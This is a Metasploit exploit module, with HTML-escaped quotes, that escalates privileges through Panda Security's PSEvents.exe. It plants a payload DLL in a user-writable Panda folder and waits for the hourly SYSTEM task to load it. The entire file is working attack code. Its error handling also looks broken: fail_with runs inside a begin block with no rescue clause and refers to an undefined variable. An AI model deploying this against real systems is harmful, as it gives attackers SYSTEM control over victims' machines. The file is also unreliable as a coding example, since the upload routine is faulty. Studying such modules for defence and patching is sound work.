# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/exploit/exe&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Exploit::FileDropper
  include Post::File

  def initialize(info={})
    super( update_info( info,
      &#039;Name&#039;          => &#039;Panda Security PSEvents Privilege Escalation&#039;,
      &#039;Description&#039;   => %q{
        PSEvents.exe within several Panda Security products runs hourly with SYSTEM privileges.
        When run, it checks a user writable folder for certain DLL files, and if any are found
        they are automatically run.
        Vulnerable Products:
        Panda Global Protection 2016 (<=16.1.2)
        Panda Antivirus Pro 2016 (<=16.1.2)
        Panda Small Busines Protetion (<=16.1.2)
        Panda Internet Security 2016 (<=16.1.2)
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        => [
          "h00die <mike@shorebreaksecurity.com>", # Module,
          &#039;Security-Assessment.com&#039; # discovery
        ],
      &#039;Platform&#039;      => [ &#039;win&#039; ],
      &#039;Targets&#039;       => [
          [ &#039;Windows x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X86_64 } ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DefaultOptions&#039; => {
        &#039;exitfunc&#039; => &#039;seh&#039;
      },
      &#039;References&#039;    => [
        [
          &#039;EDB&#039;, &#039;40020&#039;,
          &#039;URL&#039;, &#039;http://www.security-assessment.com/files/documents/advisory/Panda%20Security%20-%20Privilege%20Escalation.pdf&#039;,
          &#039;URL&#039;, &#039;http://www.pandasecurity.com/uk/support/card?id=100053&#039;
        ]
      ],
      &#039;DisclosureDate&#039;=> &#039;Jun 27 2016&#039;
    ))
    register_options(
      [
        OptEnum.new(&#039;DLL&#039;, [ true, &#039;dll to create&#039;, &#039;cryptnet.dll&#039;,
                             [&#039;cryptnet.dll&#039;, &#039;bcryptPrimitives.dll&#039;, &#039;CRYPTBASE.dll&#039;]]),
        OptInt.new(&#039;ListenerTimeout&#039;, [true, &#039;Number of seconds to wait for the exploit&#039;, 3610]),
      ], self.class)
  end

  def get_path()
    case sysinfo[&#039;OS&#039;]
    when /Windows (7|8|10|2012|2008)/
      return &#039;%ProgramData%\\Panda Security\\Panda Devices Agent\\Downloads\\1a2d7253f106c617b45f675e9be08171&#039;
    when /Windows (NT|XP)/
      return &#039;%AllUsersProfile%\\Application Data\\Panda Security\\Panda Devices Agent\\Downloads\\1a2d7253f106c617b45f675e9be08171&#039;
    end
  end

  def check
    if directory?(get_path())
      print_good(&#039;Vuln path exists&#039;)
      CheckCode::Appears
    else
      vprint_error("#{get_path()} doesn&#039;t exist on target")
      CheckCode::Safe
    end
  end

  def exploit
    vprint_status("OS Detected as: #{sysinfo[&#039;OS&#039;]}")

    payload_filepath = get_path()
    payload_filepath = "#{payload_filepath}\\#{datastore[&#039;DLL&#039;]}"
    upload_payload_dll(payload_filepath)

    # start the hour wait
    stime = Time.now.to_f
    print_status &#039;Starting the payload handler, waiting for PSEvents.exe to process folder (up to an hour)...&#039;
    print_status "Start Time: #{Time.now.to_s}"
    until session_created? || stime + datastore[&#039;ListenerTimeout&#039;] < Time.now.to_f
      Rex.sleep(1)
    end
  end

  def upload_payload_dll(payload_filepath)
    payload = generate_payload_dll()
    print_status(&#039;Uploading the Payload DLL to the filesystem...&#039;)
    begin
      vprint_status("Payload DLL #{payload.length} bytes long being uploaded..")
      write_file(payload_filepath, payload)
      register_file_for_cleanup(payload_filepath)
      fail_with(Failure::Unknown, "Error uploading file #{payload_filepath}: #{e.class} #{e}")
    end
  end
end

